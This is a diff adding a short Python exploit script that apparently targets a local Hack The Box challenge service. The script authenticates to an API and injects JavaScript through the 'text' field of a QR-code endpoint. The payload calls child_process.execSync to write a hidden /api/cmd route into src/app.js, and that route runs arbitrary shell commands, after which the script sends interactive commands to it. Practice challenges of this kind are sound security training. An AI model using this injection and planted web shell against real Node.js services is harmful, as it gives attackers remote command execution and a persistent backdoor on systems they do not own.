@@ -1,0 +1,32 @@
+#!/usr/bin/python3
+
+import requests
+
+url = 'http://localhost:5000'
+
+auth_path = '/api/auth/authenticate'
+auth_data = {"email": "test@hackthebox.com"}
+headers = {'Content-Type': 'application/json'}
+
+session = requests.Session()
+
+# authenticate to the API
+auth_request = session.post(url+ auth_path, json=auth_data, headers=headers)
+token = auth_request.json().get('token')
+
+# generate QR code API call
+generateQR_path = '/api/service/generate'
+
+cmd_inj = {"text": "'}) + require('child_process').execSync('sed -i \"17i\\app.get(\\\\\"/api/cmd\\\\\", (req, res) => {const cmd = require(\\\\\"child_process\\\\\").execSync(req.query.cmd).toString(); res.send(cmd);});\\\" src/app.js')//"}
+
+auth_headers = {'Content-Type': 'application/json', 'Authorization' : 'Bearer ' + token}
+generate_request = session.post(url+generateQR_path,json=cmd_inj, headers=auth_headers)
+response = generate_request.text
+
+# call cmd_inj API
+cmd_inj_path = '/api/cmd'
+cmd = input('Enter your command: ')
+
+# put the command directly into the URL
+cmd_inj_request = session.get(f"{url}{cmd_inj_path}?cmd={cmd}")
+print(cmd_inj_request.text)
